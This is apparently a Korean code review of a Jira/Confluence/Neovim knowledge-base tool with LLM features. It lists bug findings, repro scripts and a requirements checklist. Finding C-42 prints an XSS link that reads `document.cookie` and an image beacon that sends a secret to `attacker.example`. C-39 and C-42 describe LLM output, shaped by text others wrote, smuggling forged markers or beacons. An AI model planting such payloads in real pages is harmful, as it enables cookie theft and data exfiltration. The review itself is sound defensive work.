- 문제: 예약 이름 앞의 `_`를 자른 뒤에 붙여 결과가 81자가 되고, 다시 넣으면 다르게 잘린다(멱등 아님).
- 근거: `C-29_safe_name_len.py` → `len(in)=80 len(once)=81 idempotent=False` (hypothesis가 찾음).
- 제안: 예약 이름이면 `max_len - 1`로 자른 뒤 `_`를 붙인다.
- 수정 파일: `scripts/lib/core.py`, `tests/test_core.py`.

### D. Phase 1–3 명령 (jira_sync, jira_act, status, kb.py, wheels)

**C-30 · `scripts/jira_sync.py:739-743`, `:902-907` · 정확성 · 중간**
- 문제: 전체 동기화는 범위 검색에 더는 안 나오는 로컬 일감을 하나씩 다시 받는데, 404만 잡는다. 한 일감이 403(권한 없음)이면 인증 오류(종료 2)로 동기화 전체가 멈추고 아무것도 쓰지 않으며 `last_full`도 갱신되지 않는다. 24시간 뒤부터는 모든 `sync`가 전체 동기화가 되어 같은 이유로 실패한다. 메시지는 토큰 탓을 한다.
- 근거: `C-30_sync_403_out_of_scope.py`(mock_jira, 임의 포트) → `sync --full -> exit 2 "권한이 없습니다 (403…)"`, 25시간 뒤 `sync -> exit 2`. Jira DC가 권한 밖 일감에 404 대신 403을 주는지는 추정.
- 제안: 일감별 루프에서 403도 404처럼 `in_scope: false`로 표시한다. 토큰 자체는 먼저 `/myself`로 확인해 죽은 토큰은 여전히 종료 2로.
- 수정 파일: `scripts/jira_sync.py`, `tests/test_jira_sync.py`.

**C-31 · `scripts/jira_act.py:666-685` · 정확성 · 중간**
- 문제: 지시서 §6.3은 모든 쓰기가 큐(pending)를 거쳐 네트워크 오류면 남는다고 한다. 전환은 `submit` 전에 전환 목록을 받아서, Jira가 꺼져 있으면 종료 3이고 큐에 아무것도 남지 않는다. Neovim은 이미 숫자 id를 보낸다. 같은 상황의 댓글은 큐에 남는다.
- 근거: `C-31_transition_offline.py` → `transition exit: 3 queued: False | comment exit: 3`(댓글은 outbox에 들어감).
- 제안: id 조회가 네트워크 오류이고 인수가 숫자면 `{transition_id}`로 pending에 넣는다(틀린 id는 보낼 때 500→failed로 이미 처리됨). 아니면 DECISIONS에 한계로 적는다.
- 수정 파일: `scripts/jira_act.py`, `tests/test_jira_act.py`.

**C-32 · `scripts/status.py:92-117`, `:356` · 정확성 · 중간 [정정: 낮음→중간]**
- 문제: 보내던 프로세스가 죽은 `sending` 레코드를 `act list`는 "불확실"(사람 판단 필요)로 보이는데 `status`는 "전송 중 1개"로 계속 보인다.
- 근거: `C-32_status_sending.py` → `MISMATCH (list=uncertain, status=전송 중): True`.
- 제안: `jira_act`의 보이는 상태 계산(`state_of`, `stale_after`)을 `lib/outbox.py`로 옮겨 status도 쓰고, "불확실 N개"를 보인다.
- 수정 파일: `scripts/status.py`, `scripts/lib/outbox.py`, `scripts/jira_act.py`, `tests/test_status.py`.

**C-33 · `scripts/kb.py:120` · 정확성 · 낮음**
- 문제: KB_AGENT 판정이 `argv[1]`만 본다. `act --root V list`(읽기)는 거부(7), `act list --root V`는 허용. 지나치게 거부할 뿐 통과시키지는 않는다. serve의 `refusal_reason`(`serve.py:75`)도 같은 규칙이라 서버에서도 거부된다(그 경우 한 번 실행으로 돌아가 결과는 같다).
- 근거: `C-33_agent_root_first.py` → `act --root … list -> exit 7`, `false refusal: True`.
- 제안: 하위 명령을 고르기 전에 `--root X`/`--root=X`를 건너뛰거나, 판정을 `jira_act.main`(이미 같은 검사를 함)에 맡긴다.
- 수정 파일: `scripts/kb.py`, `scripts/serve.py`, `tests/test_kb_dispatch.py`.

**C-34 · `scripts/jira_act.py:578-580` · 정확성 · 낮음 (추정)**
- 문제: 승격 성공 뒤 `link_promoted`(잠금 필요)나 `outbox.update`가 예외(잠금 바쁨·파일 바쁨)를 내면, 레코드는 이미 done인데 flush 루프가 종료 6으로 끝난다. 남은 레코드는 안 보내지고 daily 줄에 `[[KEY]]`가 안 붙는다. `cmd_promote`의 중복 검사(763-770)는 pending/sending만 보므로 같은 줄을 다시 승격하면 일감이 두 개 생긴다.
- 근거: 코드 읽기(재현 안 함).
- 제안: 두 호출을 `try/except core.KbError`로 감싸 경고만 남기고(588-592의 `sync_key` 처리와 같이), 중복 검사에 `linked: false`인 done 승격도 넣는다.
- 수정 파일: `scripts/jira_act.py`, `tests/test_jira_act.py`.

**C-35 · `scripts/wheels.py:222` · 정확성 · 중간 [정정: 낮음→중간]**
- 문제: D57은 스크립트가 직접 실행돼도 스스로 거부한다고 한다. `wheels.py`만 `refuse_if_agent`가 없다(init·demo·schedule·push·compile·jira_act는 있다).
- 근거: `C-35_wheels_agent.py` → `KB_AGENT=1 kb.py wheels --dry-run -> exit 7; python scripts/wheels.py --dry-run -> exit 0`.
- 제안: `wheels.main` 앞에서 `core.refuse_if_agent("wheels")`.
- 수정 파일: `scripts/wheels.py`, `tests/test_packaging.py`.

**C-36 · `scripts/lib/jira_client.py:489-505` · 정확성 · 낮음 (추정)**
- 문제: 페이지마다 서버가 상대 날짜 JQL(`-30d`, `-Nm`)을 다시 계산한다. 결과가 500개를 넘으면 페이지 사이에 경계를 넘는 일감 하나가 밀려 빠질 수 있고, 전체 동기화가 그 일감을 `in_scope: false`로 잘못 표시한다.
- 근거: 코드 읽기.
- 제안: 첫 페이지 시각으로 절대 시각 JQL을 만들거나 `ORDER BY key`로 고정하고 빠진 키를 다음 실행에서 다시 본다.
- 수정 파일: `scripts/lib/jira_client.py`, `scripts/jira_sync.py`.

### E. B·C단계 (llm_client, compile, ingest_images, confluence_push, config 호스트 검사)

**C-37 · `scripts/lib/llm_client.py:177-182` · 정확성 · 중간**
- 문제: `normalize_message`가 내용의 **마지막** `</think>`에서 자른다. daily나 이미지 글에 `</think>`가 있고 모델이 이를 JSON 필드에 되풀이하면 JSON이 반으로 잘린다. 두 번 시도·모든 fallback에서 실패해 그 단위가 skipped, 세 번 뒤 `gave_up`이 된다. LLM 관련 업무 메모라면 일어날 법하다.
- 근거: `C-37_think_and_hosts_probe.py` → `literal_in_json content='to end","source_line":"L1"}],"actions":[]}' -> PARSE FAIL`.
- 제안: 내용이 `<think>`로 시작할 때만, 또는 `</think>` 앞에 `{`·`[`가 없을 때만 자른다. 먼저 전체를 JSON으로 읽어 보고 실패할 때만 자르는 것도 된다.
- 수정 파일: `scripts/lib/llm_client.py`, `tests/test_llm_client.py`.

**C-38 · `scripts/lib/llm_client.py:177-182` · 개선 · 낮음**
- 문제: `<THINK>`, `<thinking>`은 지우지 않는다. Nemotron은 소문자 `<think>`라 강화 수준이다.
- 근거: 같은 파일 → `upper`, `thinking_tag -> PARSE FAIL`.
- 제안: 대소문자 무시 정규식, `think(ing)?`.
- 수정 파일: `scripts/lib/llm_client.py`.

**C-39 · `scripts/compile.py:487` · 정확성 · 중간**
- 문제: `_one_line`이 `<!--`·`-->`를 한 번만 지워, `<!<!---- src:X ---->>`가 `<!-- src:X -->`로 다시 생긴다. 모델 출력(T2 제목·내용·근거, T3 요약, T4 이유)은 Jira 본문·이미지 글처럼 남이 쓴 글에 영향을 받는다. 위조한 `src:` 표시는 다른 줄의 결정을 막고, 닫히지 않은 `<!--`는 뒤의 진짜 `-->`(출처 줄 끝)와 짝이 되어 Obsidian에서 숨고 Confluence 게시에서 출처 줄이 조용히 빠진다.
- 근거: `C-39_one_line_comment.py` → `out: 결정 <!-- src:0123456789abcdef -->`, `prepare ok: … - 내용: 결정`(출처 줄 없음).
- 제안: 바뀌지 않을 때까지 반복해 지우거나 `<`·`>`를 모두 지운다. `ingest_images.clean`에도 적용한다.
- 수정 파일: `scripts/compile.py`, `scripts/ingest_images.py`, `tests/test_compile.py`.

**C-40 · `scripts/ingest_images.py:156-193`, `:223` · 정확성 · 중간**
- 문제: "아직 참조되는 이미지인가" 검사가 `daily/`만 본다. `inbox/note.md`나 위키 페이지에 끼운 inbox 이미지를 `raw/assets/YYYY-MM-DD-HHMM-<이름>`으로 옮겨 그 링크가 깨진다(§10 "inbox 이미지 이동"은 허용이지만 사람이 쓴 링크를 깨면 안 된다).
- 근거: `C-40_inbox_links.py` → `would move to: raw/assets/2026-11-05-1830-사진.png -> ![[사진.png]] in inbox/현장 메모.md and wiki/topics/배포.md break`.
- 제안: `inbox/*.md`, `wiki/**/*.md`의 embed 대상도 모으거나, 어떤 `.md`든 참조하는 이미지는 이름을 바꾸지 않는다.
- 수정 파일: `scripts/ingest_images.py`, `tests/test_ingest_images.py`.

**C-41 · `scripts/ingest_images.py:221` · 정확성 · 중간 [정정: 낮음→중간]**
- 문제: `inbox/회의.png` 옆에 사용자가 쓴 `inbox/회의.md`가 있으면 사이드카가 있는 것으로 보고 영영 처리하지 않는다. status의 미처리 이미지 수도 0이다.
- 근거: 같은 파일 → `C-41: inbox image with a same-name user note is never ingested`.
- 제안: front matter에 `source_image`가 있을 때만 사이드카로 본다.
- 수정 파일: `scripts/ingest_images.py`.

**C-42 · `scripts/confluence_push.py:446-473` · 개선 · 중간 [정정: 낮음→중간] (Confluence 쪽 동작은 추정)**
- 문제: 날 HTML은 잘 이스케이프하지만 Markdown 링크·이미지는 거르지 않는다. `[x](javascript:…)`, `data:` 링크, `![](https://외부/?d=…)`가 storage 형식에 그대로 간다. Jira 글에 영향받은 T3 요약이 외부 이미지(비컨)를 Confluence로 실을 수 있다.
- 근거: `C-42_storage_links.py` → `<a href="javascript:alert(document.cookie)">`, `<img … src="https://attacker.example/c?d=SECRET" />`. Confluence DC가 이를 스스로 거르는지는 확인 못 함.
- 제안: href는 http/https/mailto만, 외부 `src`의 `<img>`는 글자로 바꾼다.
- 수정 파일: `scripts/confluence_push.py`, `tests/test_confluence_push.py`.

**C-43 · `scripts/lib/config.py` (`is_public_host`) · 개선 · 낮음**
- 문제: company 모드 차단 목록이 도메인 기반이라 공개 IP 주소(`https://104.18.0.1/v1`)는 막지 않는다. D44 문구대로이긴 하다. 그 밖의 우회(대문자, 끝 점, 포트, userinfo, `%2e`, 역슬래시, IDN·전각, `KB_ENVIRONMENT`·`KB_LLM_PROFILES`)는 모두 막았다.
- 근거: `C-37_think_and_hosts_probe.py` 출력 `False checked='104.18.0.1'`.
- 제안: company 모드에서 `ipaddress.ip_address(host).is_global`이면 거부한다.
- 수정 파일: `scripts/lib/config.py`, `tests/test_company_guard.py`.

**C-44 · `scripts/lib/llm_client.py:755-788` · 개선 · 낮음 (추정)**
- 문제: 스키마 검증 실패 뒤 재시도가 temperature 0의 같은 요청이라, 결정적인 서버는 같은 틀린 답을 낼 가능성이 크다.
- 근거: 코드 읽기.
- 제안: 재시도 메시지에 검증 오류를 덧붙인다.
- 수정 파일: `scripts/lib/llm_client.py`.

**C-45 · `scripts/lib/llm_detect.py` · 정확성 · 중간 [정정: 낮음→중간]**
- 문제: 지시서 §6.11 "전체 탐지는 10회 이하 호출". POST는 10회로 묶였지만(mock 계수 5–7회), `GET /models`는 세지 않고 429면 2회까지 다시 시도해 최악 13회다.
- 근거: 서브에이전트 mock 계수(재현 파일 없음, 코드 확인).
- 제안: GET도 세거나 재시도 없이 보낸다.
- 수정 파일: `scripts/lib/llm_detect.py`, `tests/test_llm_detect.py`.

### F. 문서·요구사항 정합성

**C-46 · `README.md:19`, `docs/DEPLOY.md:14`, `install.ps1:75`, `scripts/doctor.py:1136-1139` vs `nvim/lua/work-kb/health.lua:11-14`, `init.lua:1` · 정확성 · 중간**
- 문제: Neovim 최소 버전이 0.11(README·DEPLOY·install·doctor)과 0.12(checkhealth 오류, init.lua)로 갈린다. 0.11 사용자는 설치가 "ok"인데 checkhealth는 ERROR다.
- 근거: 각 줄. USER-GUIDE:99만 차이를 인정한다.
- 제안: 하나로 정해(실제로 0.12 API를 쓰면 0.12) 코드 세 곳과 문서를 맞추고 DECISIONS 6장에 적는다.
- 수정 파일: `install.ps1`, `scripts/doctor.py`, `nvim/lua/work-kb/health.lua`, `README.md`, `docs/DEPLOY.md`.

**C-47 · `docs/USER-GUIDE.md:219` · 정확성(문서) · 중간 [정정: 낮음→중간]**
- 문제: "공백은 AND"라고 쓰지만 순서는 fzf-lua → rg(`--fixed-strings`, 구 전체) → `kb.py search`(AND)다. rg가 있으면 같은 질의의 결과가 다르다.
- 근거: `C-47_search_and.lua` → `rg 'front 캐시' -> 0건`, `kb 'front 캐시' -> 1건`.
- 제안: 문서를 실제 순서대로 고치거나, rg에 낱말마다 `-e`를 주지 말고 kb.py와 같은 AND 의미를 맞춘다.
- 수정 파일: `docs/USER-GUIDE.md` (또는 `nvim/lua/work-kb/search.lua`).

**C-48 · `docs/USER-GUIDE.md:92`, `docs/README.md:45` · 정확성(문서) · 중간**
- 문제: 볼트를 따로 둘 때 `KB_ROOT`를 쓰라고 하지만 플러그인은 늘 `--root <config.vault()>`를 넘겨 `KB_ROOT`를 무시한다. 캡처는 저장소로, 예약 작업·CLI는 `KB_ROOT`로 가 볼트가 갈린다.
- 근거: `proc.lua:43`, `:52`. `obsidian/setup.md:11`은 맞게 적었다.
- 제안: "Neovim 쪽은 nvim-config의 `opts.vault`(setup의 vault)를 같은 폴더로 정한다"를 넣는다. 또는 setup에서 vault가 없으면 `KB_ROOT`를 기본값으로 쓴다.
- 수정 파일: `docs/USER-GUIDE.md`, `docs/README.md` (선택: `nvim/lua/work-kb/config.lua`).

**C-49 · `docs/USER-GUIDE.md:229`, `docs/README.md` §6, `docs/DEPLOY.md:117-129` · 개선 · 중간**
- 문제: 지시서 §6.8 필수 요건 "접두 키 한 줄 교체, 두 방법을 README에"가 문서에 없다. 코드는 지원한다(`setup({prefix=…})`, `rebind_prefix`, 직접 매핑). DEPLOY 7단계도 "필요하면 접두 키 변경"과 "capture.ahk(선택)"를 뺐다. §8 Phase 1 "접두 키 교체 1회 사용자 확인"도 Neovim 확인 목록에 없다.
- 근거: 각 줄, `init.lua:16`, `:137-170`.
- 제안: USER-GUIDE 6.2와 DEPLOY 7단계에 두 방법(`opts = { prefix = "<F8>" }`, `vim.keymap.set("n","<F8>c",function() require("work-kb").call("capture") end)`)을 적고 확인 목록에 넣는다.
- 수정 파일: `docs/USER-GUIDE.md`, `docs/DEPLOY.md`, `docs/README.md`, `docs/DECISIONS.md`.

**C-50 · `docs/DECISIONS.md:3`, `:9-19`, `:25-43` · 정확성(문서) · 중간**
- 문제: Emacs→Neovim 전환이 결정 기록에 제자리로 들어가지 않았다. 우선순위 줄(3행)에 6장이 없어 형식상 지시서 §6.8(Emacs)이 6장보다 앞선다. §0은 아직 Emacs 확인 항목(`C-c k c`, `setq work-kb-prefix-key`, dired)을 나열한다. §1 표에 `emacs/`→`nvim/`, transient→자체 메뉴, `C-u g`→`G`, consult→fzf-lua/rg, `markdown-enable-wiki-links` 대응 없음, §9.7 문구 변경 행이 없다. 옛 기록(D62 `KB_SKIP_EMACS`, D64 `emacs/`, D08 `tests/emacs`, 277·280행)도 지금과 다르다.
- 근거: 각 줄, `config.py:77`(`KB_SKIP_NVIM`), `test_repo_tree.py:724`.
- 제안: 우선순위에 6장을 넣고, §0을 Neovim 확인 항목으로 바꾸고, §1에 위 행을 더하고, 6장에 "nvim 판에서 대체된 기록" 목록을 둔다.
- 수정 파일: `docs/DECISIONS.md`.

**C-51 · `docs/DEPLOY.md:4`, `:117`, `tests/test_docs.py:5`, `:38`, `docs/DECISIONS.md:277` · 정확성(문서) · 중간 [정정: 낮음→중간]**
- 문제: 지시서 §9는 DEPLOY에 "그대로" 싣는다고 한다. 7단계는 Neovim용으로 다시 썼고 시험의 CHECKLIST도 바꿨는데, DEPLOY 4행·test_docs 5행·DECISIONS 277행은 여전히 "원문 그대로"라고 한다.
- 근거: 각 줄.
- 제안: DECISIONS §1에 변경 행을 두고 세 곳 문구를 "7단계는 Neovim에 맞게 고침"으로 바꾼다.
- 수정 파일: `docs/DEPLOY.md`, `docs/DECISIONS.md`, `tests/test_docs.py`.

**C-52 · `README.md:9`, `docs/USER-GUIDE.md:61` · 정확성(문서) · 중간 [정정: 낮음→중간]**
- 문제: "Python 쪽은 두 브랜치가 같다"지만 `serve.py`(+345행), `kb.py` serve, `doctor.py` Neovim 점검, `KB_SKIP_NVIM`, `deploy_check.py` 필수 파일이 다르다.
- 근거: `git diff main...HEAD -- scripts`.
- 제안: "거의 같다. nvim 판에는 `kb.py serve`와 Neovim 점검이 더 있다".
- 수정 파일: `README.md`, `docs/USER-GUIDE.md`.

**C-53 · `docs/USER-GUIDE.md:214`, `:225`, 5.4절, `AGENTS.md:123` · 개선(문서) · 중간 [정정: 낮음→중간]**
- 문제: (1) `c`가 "한 줄 입력"이라 쓰지만 실제는 `*work-kb-capture*` 분할 버퍼(`C-c C-c` 저장, `C-c C-k` 취소, 여러 줄 가능). (2) `G`는 "파일을 바꾸지 않는다"만 있고 LLM을 호출한다는 말이 없다(회사 환경·비용). (3) 5.4 Lua 예시는 역슬래시 경로를 그대로 넣으면 오류다. (4) AGENTS.md는 status가 "프로필별 연결·탐지"를 보인다고 하지만 status는 연결을 확인하지 않는다(지시서 §6.10도 연결 상태를 요구).
- 근거: `capture.lua:104-106`, `:153-157`; `compile --help`; `status.py`(네트워크 없음).
- 제안: 각 문구를 고친다. (4)는 doctor 결과 캐시를 status에 보이거나 문구를 고친다.
- 수정 파일: `docs/USER-GUIDE.md`, `AGENTS.md` (선택: `scripts/status.py`).

**C-54 · `tests/test_docs.py:27-29`, `:218-220`, `tests/test_repo_tree.py:73` · 개선 · 낮음**
- 문제: 루트 README.md가 CHECKED_DOCS에 없어 그 안의 명령과 실제 호스트(github.com, 8/13/14/26행)가 검사되지 않는다(DECISIONS:277 "`*.invalid`만" 규칙과 어긋남). `test_repo_tree`의 DOCS에 USER-GUIDE·PACKAGING이 없다. test_docs의 "안내서가 없으면 건너뜀" 분기는 낡았고 키 이름까지는 대조하지 않는다.
- 근거: 각 줄.
- 제안: 목록에 넣고, USER-GUIDE 키 표를 `init.lua` `M.keys`·`jira.MENU`와 이름까지 대조한다.
- 수정 파일: `tests/test_docs.py`, `tests/test_repo_tree.py`.

### G. 테스트·도구

**C-55 · `tests/test_install_script.py` (`_fake_venv`), `tests/test_packaging.py:192`, `scripts/wheels.py:253` · 개선 · 낮음**
- 문제: 설치 시험 3개는 **작업 트리의 `.venv`** 런처와 site-packages를 빌려 쓰고, packaging 시험 2개는 `subprocess.run`만 가짜로 바꾸고 `sys.executable`의 pip 존재 검사는 실제로 한다. 그래서 pip 없는 venv(`uv venv` 기본값)나 `.venv` 없는 체크아웃에서 실패한다. 실패 출력은 "pip install failed"라 원인을 알기 어렵다.
- 근거: 3.14·3.13 (3.14 단일 대상으로 범위 밖) 전체 실행 모두 같은 5개 실패. `.venv`에 pip를 넣은 뒤 5개 3회 연속 통과. 3.13(pip 없음)에서 packaging 2개는 3회 모두 실패 (3.14 단일 대상으로 범위 밖).
- 제안: 가짜 venv는 pytest를 돌리는 인터프리터(`sys.base_prefix`)에서 만들고 pip 존재를 전제하면 `pytest.skip`으로 이유를 밝힌다. packaging 시험은 pip 검사 함수도 가짜로 바꾼다. README의 개발 환경 안내에 `uv venv --seed`를 적는다.
- 수정 파일: `tests/test_install_script.py`, `tests/test_packaging.py`, `README.md`.

**C-56 · 커버리지 공백 · 개선 · 낮음**
- 문제: 전체 87%(분기 605개 놓침). 핵심 모듈 중 낮거나 위험한 분기를 놓친 곳:
  - `scripts/serve.py` 14%: 시험이 서버를 하위 프로세스로 띄워 측정되지 않는다(실제 시험은 `test_serve.py` 17개로 충분). 하위 프로세스 커버리지(`COVERAGE_PROCESS_START`)를 켜거나 `handle`·`run_argv`를 프로세스 안에서 부르는 단위 시험을 더하면 수치가 맞는다.
  - `scripts/jira_act.py:559-565`: Jira에는 보냈는데 outbox에 done을 못 적는 경로(중복 전송 방지의 핵심). 시험 없음. `:590-592` 캐시 갱신 실패 경고도 없음. C-34와 같은 자리다.
  - `scripts/lib/core.py:336-340`, `:363-369`, `:380-383`: atomic_write의 공유 위반 재시도 끝(FileBusy)과 비 Windows 잠금. Windows 재시도 끝 분기가 시험되지 않는다.
  - `scripts/lib/net.py:217-224`(HTTP 날짜 꼴 Retry-After), `:313-325`(상태별 진단 문구): 429 처리의 날짜 꼴은 시험 없음.
  - `scripts/lib/outbox.py:269-274` `counts`: 시험 없음(C-32와 관련).
  - `scripts/doctor.py` 76%, `lib/confluence_client.py` 82%, `demo.py` 44%(demo 마커로 빠짐).
- 근거: `pytest --cov=scripts --cov-branch --cov-report=term-missing` 출력.
- 제안: 위 분기에 시험을 더한다. 특히 jira_act 559-565는 Jira 성공 뒤 `_finish`에 `FileBusy`를 넣는 시험으로 "다시 보내지 않음"을 고정한다.
- 수정 파일: `tests/test_jira_act.py`, `tests/test_core.py`, `tests/test_jira_client.py`, `tests/test_status.py`, (선택) `pytest.ini`/`.coveragerc`.

**C-57 · 정적 분석 잔여 · 개선 · 낮음**
- 문제: 죽은 코드·무해한 경고 몇 개. `scripts/lib/wikimarkup.py:146` `list_widths`(F841), `lint.py:419-420`, `lint.py:1059 SECTION_ORDER`, `schedule.py:89`, `nvim/lua/work-kb/proc.lua:515` 쓰지 않는 `err`, `server.lua:188` 같은 분기, tests/nvim 스펙의 죽은 대입 5개, PSScriptAnalyzer 빈 catch 6곳.
- 근거: 위 "검증 결과" 표.
- 제안: 정리하고, 저장소에 ruff·luacheck 설정을 두어 사용자 전역 설정과 무관하게 같은 결과가 나오게 한다(지금 `ruff check .` 386건은 대부분 전역 규칙).
- 수정 파일: 해당 파일, (새) `pyproject.toml` 또는 `ruff.toml`, `.luacheckrc`.

## 요구사항 대조 (요약)

서브에이전트 대조표를 합쳤다. ✓=구현·시험됨, △=일부, ✗=없음.

| 요구 | 상태 | 비고 |
|---|---|---|
| §2 company 모드 공개 호스트 → doctor ✗, compile·ingest 종료 5 | ✓ | IP 주소만 열림(C-43) |
| §5.0 관리 구역: 다른 구역·마커 밖 바이트 보존 | ✓ | hypothesis 3000건 통과. CR만 쓰는 파일 멱등 위반(C-24) |
| §5.1 캡처는 `## 기록` 끝, 키 정규화(코드·URL 제외, 멱등), `@이름`, 이월 | △ | C-19·C-20·C-21·C-22·C-23·C-26 |
| §5.3·§6.2 jira 캐시, 전체·증분, mentions 보존, 종료 0/2/3/4 | △ | 403 하나로 영구 실패(C-30), 페이지 밀림(C-36, 추정) |
| §6.1 link 멱등, 1,000개 2초 | ✓ | 따뜻한 캐시 0.14초, 처음 3.9–4.7초(DECISIONS에 재해석 기록) |
| §6.3 쓰기는 큐 경유, 네트워크 오류면 남김, 5회 뒤 failed, KB_AGENT 거부, `--yes` | △ | 전환은 오프라인 큐 안 됨(C-31), 과잉 거부(C-33), wheels 직접 실행(C-35) |
| §6.4 daily_prepare, `--check-done` | ✓ | 시간대 차이(C-11) |
| §6.5 LLM: enabled=false 조용히 0, think 제거, 스키마 재시도, fallback, daily 불변 | △ | C-37·C-38·C-39·C-44 |
| §6.5 T6 ingest: 해시 중복 제외, 1600px, 사이드카, inbox 이동 | △ | C-40·C-41 |
| §6.6 lint(+T5), §6.7 push(금지 폴더 차단) | ✓ | 링크 거르기(C-42) |
| §6.8 편집기: 접두 키 한 줄 교체, C/F 이미지, Jira 메뉴, 전역 키 | △ | 코드 ✓, 문서 요건 ✗(C-49), capture.ahk 미검증 |
| §6.10 status: 동기화·outbox·제안·이미지·프로필·환경 | △ | 연결 상태 없음, 불확실 표시 틀림(C-32·C-53) |
| §6.11 탐지 10회 이하, 후보 순서, context_tokens assumed | △ | GET 미계수(C-45), `source:` 대신 `context_source:` |
| §9 DEPLOY 체크리스트 "그대로" | △ | 7단계 변경, 결정 기록 없음(C-51) |
| §10 daily/inbox/raw 수정 금지(예외 3개) | △ | 4-백틱 코드 블록 정규화(C-20), 캡처 비원자 쓰기(C-03) |
| DECISIONS에 Neovim 전환 반영 | ✗ | C-50 |

## 재현 파일

- `review/repro/C-*.py|lua|ps1`: 항목별 재현. 모두 버그가 있으면 종료 1.
- 공용 도우미: `repro_vault.py`(임시 볼트), `repro_kb.py`(임시 볼트+kb.py 실행, 가짜 keyring, 루프백 밖 차단), `repro_common.lua`(Lua 도우미), `run_lua.ps1`(XDG를 %TEMP%로 돌려 헤드리스 실행).
- `review/repro/hypothesis/test_prop_*.py`: 속성 기반 검사. `.venv\Scripts\python.exe -X utf8 -m pytest -q review/repro/hypothesis`. 현재 코드의 반례 때문에 일부는 실패한다(항목으로 올린 것).
- 모든 재현은 임시 폴더·임의 포트만 쓰고 실제 Jira·LLM·레지스트리·nvim 설정을 건드리지 않는다.
